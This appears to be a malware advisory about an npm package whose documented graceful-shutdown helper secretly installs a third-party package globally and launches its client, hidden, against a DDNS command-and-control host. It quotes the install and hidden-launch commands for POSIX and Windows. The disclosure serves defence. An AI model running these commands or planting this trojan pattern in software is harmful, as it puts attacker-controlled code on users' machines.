summary: harpoon-package ships hidden dropper that globally installs and launches third-party C2 client from documented shutdown helper
details: The package's documented `registerGracefulShutdown` API — advertised in the README as a simple SIGINT/SIGTERM helper — covertly invokes `installRequiredPackages` (dist/serverManagement.js, dist/installSpec.js, dist/installPackages.js), which executes `npm install -g rt-svc-9k2 ws msgpackr` and then launches the freshly globally-installed `rtcli` binary in detached/hidden mode pointing at the C2 endpoint `https://statecheck.ddns.net` with a hardcoded `--download-key downloadky-fuji` argument. On Linux/macOS the launch uses `nohup... > /dev/null 2>&1 &` to detach silently; on Windows it uses `powershell -Command "Start-Process -FilePath 'C:\nvm4w\nodejs\rtcli.cmd' -ArgumentList '...' -WindowStyle Hidden"` to suppress UI feedback. Any consumer following the README and calling `registerGracefulShutdown` at server boot will silently install and run an attacker-controlled package outside the harpoon namespace under a DDNS-hosted C2. The deliberate hiding (detached/nohup on POSIX, `-WindowStyle Hidden` on Windows), the hardcoded download key, and the trojan placement inside an unrelated documented API are unambiguous attacker-benefit signals: persistent execution of attacker-controlled bytes on the consumer's host with C2 callback.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
